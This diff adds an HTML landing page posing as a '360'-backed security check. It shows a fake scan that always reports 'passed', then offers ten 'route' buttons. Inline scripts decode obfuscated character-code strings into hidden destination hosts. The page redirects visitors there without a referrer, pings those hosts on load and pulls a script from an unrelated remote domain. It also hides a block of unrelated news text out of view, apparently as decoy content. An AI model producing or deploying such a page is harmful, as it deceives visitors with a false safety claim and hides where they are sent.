@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="ie=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+  <title>
+   安全检测
+  </title>
+  <script src="https://libs.cdnjs.net/jquery/3.3.1/jquery.min.js">
+  </script>
+ </head>
+ <body>
+  <style type="text/css">
+   body {
+				width: 100%;
+				max-width: 600px;
+				margin: 0 auto;
+			}
+
+			.wxtip {
+				background: rgba(0, 0, 0, 0.5);
+				text-align: center;
+				position: fixed;
+				left: 0;
+				top: 0;
+				width: 100%;
+				height: 100%;
+				z-index: 998;
+				display: none;
+			}
+
+
+			.wxtip-txt {
+				margin-top: 107px;
+				color: #fff;
+				font-size: 16px;
+				line-height: 1.5;
+			}
+
+
+			@font-face {
+				font-weight: normal;
+				font-style: normal;
+				font-family: "weui";
+				src: url('data:application/octet-stream;base64,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') format('truetype');
+			}
+
+
+			[class^="weui-icon-"],
+			[class*=" weui-icon-"] {
+				display: inline-block;
+				vertical-align: middle;
+				font: normal normal normal 14px/1 "weui";
+				font-size: inherit;
+				text-rendering: auto;
+				-webkit-font-smoothing: antialiased;
+
+				&:before {
+					display: inline-block;
+					margin-left: .2em;
+					margin-right: .2em;
+				}
+			}
+
+			.weui-icon-waiting:before {
+				content: "\EA09";
+			}
+
+			.weui-icon-success:before {
+				content: "\EA04"
+			}
+
+			.weui-btn_primary {
+				background-color: #1AAD19;
+			}
+
+			.weui-btn {
+				display: block;
+				position: relative;
+				justify-content: center;
+				margin-left: auto;
+				margin-right: auto;
+				padding-left: 14px;
+				padding-right: 14px;
+				box-sizing: border-box;
+				font-size: 18px;
+				text-align: center;
+				text-decoration: none;
+				color: #FFFFFF;
+				line-height: 2.55555556;
+				border-radius: 5px;
+				-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+				overflow: hidden;
+				margin-bottom: 20px;
+				align-items: center;
+			}
+			.red{
+				color: #FF5722 !important;
+			}
+			.str{
+				color: #FFFFFF;
+				font-size: 12px;
+				position: absolute;
+				right: 10px;
+				top:8px;
+				margin-left: 20px;
+			}
+
+			.weui-btn_default {
+				color: #000000;
+				background-color: #F8F8F8;
+			}
+
+			.weui-icon-waiting {
+				color: #10AEFF;
+			}
+
+			.weui-icon-success {
+				color: #1AAD19;
+			}
+
+			.icon {
+				font-size: 93px;
+				margin: 20px auto;
+			}
+
+			.actions {
+				padding: 10px 30px;
+			}
+
+			.footer {
+				width: 100%;
+				text-align: center;
+				color: #999;
+				font-size: 12px;
+			}
+
+			* {
+				margin: 0;
+				padding: 0;
+			}
+
+			img {
+				max-width: 100%;
+				height: auto;
+			}
+
+			.logo {
+				display: block;
+				padding: 20px 0 15px;
+				font-size: 45px;
+				font-weight: bold;
+				color: #ff5722;
+				text-shadow: 2px 1px 1px #000;
+				text-align: center;
+				background: linear-gradient(to top, #41d843, #1c6109);
+				border-bottom: 1px #eee solid;
+			}
+
+			.llq {
+				display: flex;
+				flex-wrap: wrap;
+			}
+
+			.llq a {
+				display: block;
+				width: calc(33.33% - 2px);
+				text-align: center;
+				line-height: 40px;
+				color: blue;
+				text-decoration: none;
+				color: #000;
+
+			}
+
+			.llq a img {
+				display: block;
+				width: 40px;
+				margin: 0 auto;
+			}
+			
+			.yqlj1 a{
+			    text-decoration: none;
+			}
+  </style>
+  <script>
+   var tim = 1;
+				setInterval("tim++", 200);
+				function auto(url,obj) {
+					
+					// time()
+					var str = tim * 10;
+					var obj=$(obj)
+					
+					obj.find('.str').html(str + 'ms');
+					if (str >= 200) {
+						obj.find('.str').addClass('red');
+					} 
+				
+				}
+			   function run(url,obj){
+					
+				   let str=`
+						<img src="${url}/${Math.random()}" onerror=auto('${url}','${obj}') style="display:none"  />
+				   `
+					document.write(str)
+					}
+  </script>
+  <div>
+   <img height="80" src="/img/050hk.gif" width="100%"/>
+  </div>
+  <div style="text-align:center;padding:10px">
+   <i class="weui-icon-waiting icon" id="icon">
+   </i>
+   <p id="iconText" style="font-size:20px;color:#555;">
+    正在安全检测
+   </p>
+   <p id="subText" style="font-size:12px;color:#999;">
+   </p>
+  </div>
+  <div class="actions" id="goHome">
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink" style="">
+    ①线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink1" style="">
+    ②线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink2" style="">
+    ③线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink3" style="">
+    ④线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink4" style="">
+    ⑤线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink5" style="">
+    ⑥线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink6" style="">
+    ⑦线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink7" style="">
+    ⑧线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="https://libs.cdnjs.net" id="openSchemeLink8" style="">
+    ⑨线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+   <a class="weui-btn weui-btn_primary" href="javascript:;" id="openSchemeLink9" style="">
+    ⑩线路→点击前往
+    <span class="str">
+    </span>
+   </a>
+  </div>
+  <h1 style="color: #9e9e9e;;padding: 10px;text-align: center;font-size: 15px;border-top: 1px #ccc solid;">
+   请使用下方推荐的浏览器访问
+  </h1>
+  <div class="llq">
+   <a href="https://www.ub66.com/">
+    <img src="/img/HY.png"/>
+    寰宇
+   </a>
+   <a href="https://www.google.cn/intl/zh-CN/chrome">
+    <img src="/img/gg.webp"/>
+    谷歌
+   </a>
+   <a href="https://www.opera.com/zh-cn">
+    <img src="/img/op.webp" style="margin-top: 3px;margin-bottom: 2px;"/>
+    欧朋
+   </a>
+   <a href="http://m.liebao.cn/">
+    <img src="/img/lb.webp"/>
+    猎豹
+   </a>
+   <a href="https://www.firefox.com.cn/download">
+    <img src="/img/hh.webp"/>
+    火狐
+   </a>
+   <a href="https://www.myquark.cn/">
+    <img src="/img/kk.webp" style="margin-top: 2px;"/>
+    夸克
+   </a>
+  </div>
+  <div style="color: red;padding: 5px;border-top: 1px #ccc solid;">
+   友情链接
+  </div>
+  <script src="https://js.99988.finance/Public/yq.js?v=1">
+  </script>
+  <div class="footer">
+   <p>
+    360安全卫士提供技术支持
+   </p>
+   <p>
+    Copyright ? 1998 -
+    <script>
+     document.write(new Date().getFullYear())
+    </script>
+    . All Rights Reserved.
+   </p>
+   <br/>
+  </div>
+  <div id="jcdiv" style="position: absolute;bottom: 0;left: 0;width: 0;height: 0;overflow: hidden;">
+  </div>
+  <script>
+   var _ = 'https://baidu.com';
+				uu = '1104111611161112111510581047104710551055104610491051104810481048110411071046109911111109105810491056105610561047';
+		
+				var u = [];
+				for (var j = 4; j <= uu.length; j += 4) {
+					u.push(String.fromCharCode(parseInt(uu.toString().substr(j - 4, 4)) - 1000));
+				}
+		
+				_ = u.join('');
+				var a = document.getElementById('openSchemeLink'),
+					it = document.getElementById('iconText'),
+					jcdiv = document.getElementById('jcdiv');;
+				a.onclick = function() {
+					var ael = document.createElement('a');
+					ael.href = _;
+					ael.setAttribute('rel', 'noreferrer');
+					ael.click();
+					setTimeout(function() {
+						location.href = _;
+					}, 333);
+					return false;
+				}
+				var _i = 1;
+				var si = setInterval(function() {
+					var txt = '正在安全检测';
+					for (var i = 0; i < _i; i++) txt += '.';
+					it.innerText = txt;
+					if (++_i > 3) {
+						clearInterval(si);
+						setTimeout(function() {
+							var icon = document.getElementById('icon');
+							var subText = document.getElementById('subText');
+							icon.classList.add("weui-icon-success");
+							it.innerHTML = "已通过安全检测";
+							subText.innerHTML = "请点击下方按钮，选择线路前往主页";
+						}, 220);
+					}
+				}, 220);
+				run(_,'#openSchemeLink')
+  </script>
+  <script>
+   var _2 = 'https://baidu.com';
+				uu2 = '110411161116111211151058104710471049104910461049105110571057105711041107104610991111110910581049105610561056';
+				var u2 = [];
+				for (var j = 4; j <= uu2.length; j += 4) {
+					u2.push(String.fromCharCode(parseInt(uu2.toString().substr(j - 4, 4)) - 1000));
+				}
+		
+				_2 = u2.join('');
+				var a2 = document.getElementById('openSchemeLink1'),
+					it2 = document.getElementById('iconText'),
+					jcdiv2 = document.getElementById('jcdiv');;
+				a2.onclick = function() {
+					var ael2 = document.createElement('a');
+					ael2.href = _2;
+					ael2.setAttribute('rel', 'noreferrer');
+					ael2.click();
+					setTimeout(function() {
+						location.href = _2;
+						/*window.open(_2);*/
+					}, 333);
+					return false;
+				}
+				run(_2,'#openSchemeLink1')
+  </script>
+  <script>
+   var _3 = 'https://baidu.com';
+				uu3 = '1104111611161112111510581047104711091109104610491051104810481048110411071046109911111109105810491056105610561047';
+				var u3 = [];
+				for (var j = 4; j <= uu3.length; j += 4) {
+					u3.push(String.fromCharCode(parseInt(uu3.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_3 = u3.join('');
+				var a3 = document.getElementById('openSchemeLink2'),
+					it3 = document.getElementById('iconText'),
+					jcdiv3 = document.getElementById('jcdiv');;
+				a3.onclick = function() {
+					var ael3 = document.createElement('a');
+					ael3.href = _3;
+					ael3.setAttribute('rel', 'noreferrer');
+					ael3.click();
+					setTimeout(function() {
+						location.href = _3;
+						/*window.open(_3);*/
+					}, 333);
+					return false;
+				}
+				run(_3,'#openSchemeLink2')
+  </script>
+  <script>
+   var _4 = 'https://baidu.com';
+				uu4 = '110411161116111211151058104710471050105010461049105110571057105711041107104610991111110910581049105610561056';
+				var u4 = [];
+				for (var j = 4; j <= uu4.length; j += 4) {
+					u4.push(String.fromCharCode(parseInt(uu4.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_4 = u4.join('');
+				var a4 = document.getElementById('openSchemeLink3'),
+					it4 = document.getElementById('iconText'),
+					jcdiv4 = document.getElementById('jcdiv');;
+				a4.onclick = function() {
+					var ael4 = document.createElement('a');
+					ael4.href = _4;
+					ael4.setAttribute('rel', 'noreferrer');
+					ael4.click();
+					setTimeout(function() {
+						location.href = _4;
+						/*window.open(_4);*/
+					}, 333);
+					return false;
+				}
+				run(_4,'#openSchemeLink3')
+  </script>
+  <script>
+   var _5 = 'https://baidu.com';
+				uu5 = '110411161116111211151058104710471107110710461049105110481048104811041107104610991111110910581049105610561056';
+				var u5 = [];
+				for (var j = 4; j <= uu5.length; j += 4) {
+					u5.push(String.fromCharCode(parseInt(uu5.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_5 = u5.join('');
+				var a5 = document.getElementById('openSchemeLink4'),
+					it5 = document.getElementById('iconText'),
+					jcdiv5 = document.getElementById('jcdiv');;
+				a5.onclick = function() {
+					var ael5 = document.createElement('a');
+					ael5.href = _5;
+					ael5.setAttribute('rel', 'noreferrer');
+					ael5.click();
+					setTimeout(function() {
+						location.href = _5;
+						/*window.open(_5);*/
+					}, 333);
+					return false;
+				}
+				run(_5,'#openSchemeLink4')
+  </script>
+  <script>
+   var _6 = 'https://baidu.com';
+				uu6 = '110411161116111211151058104710471100110010461049105110481048104811041107104610991111110910581049105610561056';
+				var u6 = [];
+				for (var j = 4; j <= uu6.length; j += 4) {
+					u6.push(String.fromCharCode(parseInt(uu6.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_6 = u6.join('');
+				var a6 = document.getElementById('openSchemeLink5'),
+					it6 = document.getElementById('iconText'),
+					jcdiv6 = document.getElementById('jcdiv');;
+				a6.onclick = function() {
+					var ael6 = document.createElement('a');
+					ael6.href = _6;
+					ael6.setAttribute('rel', 'noreferrer');
+					ael6.click();
+					setTimeout(function() {
+						location.href = _6;
+						/*window.open(_6);*/
+					}, 333);
+					return false;
+				}
+				run(_6,'#openSchemeLink5')
+  </script>
+  <script>
+   var _7 = 'https://baidu.com';
+				uu7 = '110411161116111211151058104710471051105110461049105110571057105711041107104610991111110910581049105610561056';
+				var u7 = [];
+				for (var j = 4; j <= uu7.length; j += 4) {
+					u7.push(String.fromCharCode(parseInt(uu7.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_7 = u7.join('');
+				var a7 = document.getElementById('openSchemeLink6'),
+					it7 = document.getElementById('iconText'),
+					jcdiv7 = document.getElementById('jcdiv');;
+				a7.onclick = function() {
+					var ael7 = document.createElement('a');
+					ael7.href = _7;
+					ael7.setAttribute('rel', 'noreferrer');
+					ael7.click();
+					setTimeout(function() {
+						location.href = _7;
+						/*window.open(_7);*/
+					}, 333);
+					return false;
+				}
+				run(_7,'#openSchemeLink6')
+  </script>
+  <script>
+   var _8 = 'https://baidu.com';
+				uu8 = '110411161116111211151058104710471119111911191046105010521054105510501055105510461099111111091058105210521051';
+				var u8 = [];
+				for (var j = 4; j <= uu8.length; j += 4) {
+					u8.push(String.fromCharCode(parseInt(uu8.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_8 = u8.join('');
+				var a8 = document.getElementById('openSchemeLink7'),
+					it8 = document.getElementById('iconText'),
+					jcdiv8 = document.getElementById('jcdiv');;
+				a8.onclick = function() {
+					var ael8 = document.createElement('a');
+					ael8.href = _8;
+					ael8.setAttribute('rel', 'noreferrer');
+					ael8.click();
+					setTimeout(function() {
+						location.href = _8;
+						/*window.open(_8);*/
+					}, 333);
+					return false;
+				}
+				run(_8,'#openSchemeLink7')
+  </script>
+  <script>
+   var _9 = 'https://baidu.com';
+				uu9 = '110411161116111211151058104710471099105010521054104610971112111210581049105610561056';
+				var u9 = [];
+				for (var j = 4; j <= uu9.length; j += 4) {
+					u9.push(String.fromCharCode(parseInt(uu9.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_9 = u9.join('');
+				var a9 = document.getElementById('openSchemeLink8'),
+					it9 = document.getElementById('iconText'),
+					jcdiv9 = document.getElementById('jcdiv');;
+				a9.onclick = function() {
+					var ael9 = document.createElement('a');
+					ael9.href = _9;
+					ael9.setAttribute('rel', 'noreferrer');
+					ael9.click();
+					setTimeout(function() {
+						location.href = _9;
+						/*window.open(_9);*/
+					}, 333);
+					return false;
+				}
+				run(_9,'#openSchemeLink8')
+  </script>
+  <script>
+   var _10 = 'https://baidu.com';
+				uu10 = '110411161116111211151058104710471119111911191046105310561056105610561104112210461099111111091058105210521051';
+				var u10 = [];
+				for (var j = 4; j <= uu10.length; j += 4) {
+					u10.push(String.fromCharCode(parseInt(uu10.toString().substr(j - 4, 4)) - 1000));
+				}
+			
+				_10 = u10.join('');
+				var a10 = document.getElementById('openSchemeLink9'),
+					it10 = document.getElementById('iconText'),
+					jcdiv10 = document.getElementById('jcdiv');;
+				a10.onclick = function() {
+					var ael10 = document.createElement('a');
+					ael10.href = _10;
+					ael10.setAttribute('rel', 'noreferrer');
+					ael10.click();
+					setTimeout(function() {
+						location.href = _10;
+						/*window.open(_10);*/
+					}, 333);
+					return false;
+				}
+				run(_10,'#openSchemeLink9')
+  </script>
+  <script>
+   var _11 = 'https://baidu.com';
+				uu11 = '1104111611161112111510581047104710991099104610491051105510551104110710461117111510581049105610561056';
+				var u11 = [];
+				for (var j = 4; j <= uu11.length; j += 4) {
+					u11.push(String.fromCharCode(parseInt(uu11.toString().substr(j - 4, 4)) - 1100));
+				}
+			
+				_11 = u11.join('');
+				var a11 = document.getElementById('openSchemeLink10'),
+					it11 = document.getElementById('iconText'),
+					jcdiv11 = document.getElementById('jcdiv');;
+				a11.onclick = function() {
+					var ael11 = document.createElement('a');
+					ael11.href = _11;
+					ael11.setAttribute('rel', 'noreferrer');
+					ael11.click();
+					setTimeout(function() {
+						location.href = _11;
+						/*window.open(_11);*/
+					}, 333);
+					return false;
+				}
+				run(_11,'#openSchemeLink10')
+  </script>
+  <script>
+   var _12 = 'https://baidu.com';
+				uu12 = '1104111611161112111510581047104710991099104610491051105110511104110710461117111510581049105610561056';
+				var u12 = [];
+				for (var j = 4; j <= uu12.length; j += 4) {
+					u12.push(String.fromCharCode(parseInt(uu12.toString().substr(j - 4, 4)) - 1200));
+				}
+			
+				_12 = u12.join('');
+				var a12 = document.getElementById('openSchemeLink11'),
+					it12 = document.getElementById('iconText'),
+					jcdiv12 = document.getElementById('jcdiv');;
+				a12.onclick = function() {
+					var ael12 = document.createElement('a');
+					ael12.href = _12;
+					ael12.setAttribute('rel', 'noreferrer');
+					ael12.click();
+					setTimeout(function() {
+						location.href = _12;
+						/*window.open(_12);*/
+					}, 333);
+					return false;
+				}
+				run(_12,'#openSchemeLink11')
+  </script>
+  <script>
+   var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f8763d60f30b94b582bd89c97faf5ae8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+  </script>
+  <div style="display:none">
+   外交部发言人汪文斌主持例行记者会。有记者提问，美方周一表示将调查中国太阳能组件生产商是否通过在四个其他国家开展业务来非法规避美太阳能关税，发言人对此有何评论？
+汪文斌表示，你提到的具体情况我不了解。我想强调的是，美方大搞贸易保护主义，将对国际产业链、供应链的稳定和全球应对气候变化合作造成干扰和破坏，最后只会反噬自己，损害自身利益。我们敦促美方停止对中国企业的无理打压，中方将采取一切必要措施维护中国企业的正当合法权益。
+(本文来自澎湃新闻，更多原创资讯请下载“澎湃新闻”APP)
+  </div>
+ </body>
+</html>
